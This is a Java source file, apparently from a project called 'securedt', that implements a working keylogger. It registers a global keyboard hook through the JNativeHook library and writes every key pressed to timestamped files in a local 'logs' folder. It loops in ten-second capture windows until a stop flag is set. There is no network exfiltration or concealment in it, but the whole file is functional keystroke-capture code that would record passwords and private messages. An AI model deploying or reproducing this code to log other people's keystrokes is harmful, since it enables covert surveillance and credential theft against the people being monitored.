/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.securedt;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author securedt
 */
public class Keylog implements NativeKeyListener {

    PrintStream myconsole;
    DateFormat dft = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
    DateFormat tm = new SimpleDateFormat("yyyyMMdd-HHmmss");
    Calendar cal;
    public int stopFlag3 = 0;
    public boolean logging = false;

    //Creates the folder to store the output files of the logs
    public Keylog() {
        //constructor
        cal = Calendar.getInstance();
        File directory = new File(String.valueOf("logs"));
        
        //if it doesn't exist, it will create the directory
        if (!directory.exists()) {
            directory.mkdir();

        }
        System.out.println("storage folder: "+directory.getAbsolutePath());
        String filename = this.tm.format(cal.getTime()) + ".out.txt";
        //saves the logs in an output file within the folder created
        try {
            try {
                this.myconsole = new PrintStream(new File("logs/"+filename));
            } catch (FileNotFoundException ex) {
                Logger.getLogger(Keylog.class.getName()).log(Level.SEVERE, null, ex);
            }

            GlobalScreen.registerNativeHook();

        } catch (NativeHookException e) {
        }
    }
    
    public void startKeyLog() throws FileNotFoundException, InterruptedException {
//        this.stopFlag3 = 0;
        while (this.stopFlag3 != 1){
            Keylog mykeyLog = null;
                mykeyLog = new Keylog();
                GlobalScreen.getInstance().addNativeKeyListener(mykeyLog);
                System.out.println("start");
                mykeyLog.startime();

                Thread.sleep(10000);
                mykeyLog.stoptime();
                System.out.println("stop");

                // finally . done.
                mykeyLog.close();
                Thread.sleep(3000); // pause for 2 seconds
        }
    }
    
//    public void stopKeylog() {
//        System.out.println("entering stopKeylog");
//        this.stopFlag3 = 1;
//    }
    
//    public static void main(String[] args) {
//        Keylog kl = new Keylog();
//        new Thread(() -> {
//        try {
//            kl.startKeyLog();
//        } catch (FileNotFoundException | InterruptedException ex) {
//            Logger.getLogger(Keylog.class.getName()).log(Level.SEVERE, null, ex);
//        }
//        }).start();
//        System.out.println("Screen logging has been started !");
//        
//        // now delay for 20 seconds then stop the thread.
//        try {
//            Thread.sleep(20000);
//
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//            System.out.println("ended");
//            kl.stopKeylog();
//        }
//        System.out.println("reach here");
//        kl.stopKeylog();
//    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (e.getKeyCode() != NativeKeyEvent.VK_ENTER) {
            this.myconsole.print(" " + NativeKeyEvent.getKeyText(e.getKeyCode()));
            //System.out.print(" " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VK_ENTER) {
            this.myconsole.println("");
            //System.out.println("");
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    private void startime() {
        //Calendar cal = Calendar.getInstance();
        this.myconsole.println("\nstart:" + this.dft.format(this.cal.getTime()));
    }

    private void stoptime() {

        cal = Calendar.getInstance();
        this.myconsole.println("\nstop:" + this.dft.format(this.cal.getTime()));
    }

    private void close() {
        GlobalScreen.unregisterNativeHook();
        this.myconsole.close();
    }
}
